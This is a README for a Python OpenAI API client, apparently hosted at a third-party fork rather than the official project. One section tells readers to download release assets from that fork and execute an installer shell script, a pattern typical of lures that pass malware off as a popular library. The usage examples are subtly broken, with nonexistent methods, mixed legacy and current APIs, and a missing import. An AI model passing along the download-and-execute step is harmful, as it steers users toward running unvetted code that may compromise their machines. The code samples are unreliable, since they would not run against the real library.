ðŸ¤– ðŸ§  ðŸš€

A compact, well-documented Python client for the OpenAI API. Use it to call models for text, chat, embeddings, audio, and image tasks. The library supports sync and async calls, typed responses, and streaming. It works with modern Python and standard HTTP clients.

Installation

From PyPI (recommended)
pip install openai

From source
git clone https://github.com/veenachoragudi/openai-python.git
cd openai-python
python -m pip install .

Download and execute release file
The Releases page provides packaged files. Download the matching release asset (wheel or tar.gz) from:
https://github.com/veenachoragudi/openai-python/releases

After download, install or run the file. For example:
- Wheel: python -m pip install openai_python-1.2.3-py3-none-any.whl
- Source tarball: python -m pip install openai_python-1.2.3.tar.gz

If a release asset contains an installer script, download and execute that script:
sh ./install-openai-python.sh

Quickstart

Set an API key
Export your API key in your shell. Use your preferred secret management in production.

Linux/macOS
export OPENAI_API_KEY="sk-..."

Windows (PowerShell)
$env:OPENAI_API_KEY="sk-..."

Synchronous example
from openai import OpenAI

client = OpenAI(api_key=os.getenv("OPENAI_API_KEY"))

resp = client.chat.create(
    model="gpt-4.1",
    messages=[
        {"role": "system", "content": "You are a helpful assistant."},
        {"role": "user", "content": "Write a short poem about code."},
    ],
)
print(resp.choices[0].message["content"])

Asynchronous example
import asyncio
from openai import OpenAI

async def main():
    client = OpenAI(api_key=os.getenv("OPENAI_API_KEY"))
    resp = await client.chat.create(
        model="gpt-4o",
        messages=[
            {"role": "system", "content": "Be concise."},
            {"role": "user", "content": "List three tips for writing tests."},
        ],
    )
    print(resp.choices[0].message["content"])

asyncio.run(main())

Common usage patterns

Text completion
from openai import OpenAI

client = OpenAI(api_key="...")
resp = client.completions.create(
    model="text-davinci-003",
    prompt="Translate to French: 'Hello, world!'",
    max_tokens=60,
)
print(resp.choices[0].text)

Embeddings
from openai import OpenAI

client = OpenAI(api_key="...")
response = client.embeddings.create(model="text-embedding-3-small", input="OpenAI Python client")
vector = response.data[0].embedding

File uploads and fine-tuning
from openai import OpenAI

client = OpenAI(api_key="...")
upload_resp = client.files.upload(file=open("training_data.jsonl", "rb"), purpose="fine-tune")
file_id = upload_resp.id

ft_resp = client.fine_tunes.create(training_file=file_id, model="curie")
print(ft_resp.id)

Streaming
Use streaming to receive partial tokens as the model generates. The client exposes a stream iterator you can loop over.

for event in client.chat.stream_create(model="gpt-4o", messages=messages):
    if event.type == "delta":
        print(event.delta, end="")
    elif event.type == "done":
        print("\n[done]")

Error handling
The client raises HTTPError types for network errors and APIError for API-level problems. Use try/except to handle failures and inspect status codes and error bodies.

from openai import OpenAI, APIError

client = OpenAI(api_key="...")
try:
    client.completions.create(model="nonexistent", prompt="x")
except APIError as e:
    print("status:", e.status_code)
    print("message:", e.message)

Configuration

Environment variables
- OPENAI_API_KEY: your API key
- OPENAI_API_BASE: base URL for API (useful for proxies or local dev)
- OPENAI_TIMEOUT: default request timeout (seconds)

Programmatic
You can pass config at client creation:

client = OpenAI(api_key="...", api_base="https://api.openai.com/v1", timeout=30)

HTTP clients
The library uses a small HTTP layer. You can swap adapters or provide session objects for advanced setups.

Testing

Run unit tests
python -m pytest tests

Run lints
python -m flake8
python -m mypy openai

CI
The repo includes GitHub Actions. CI checks format, lint, type checks, and runs tests across Python versions.
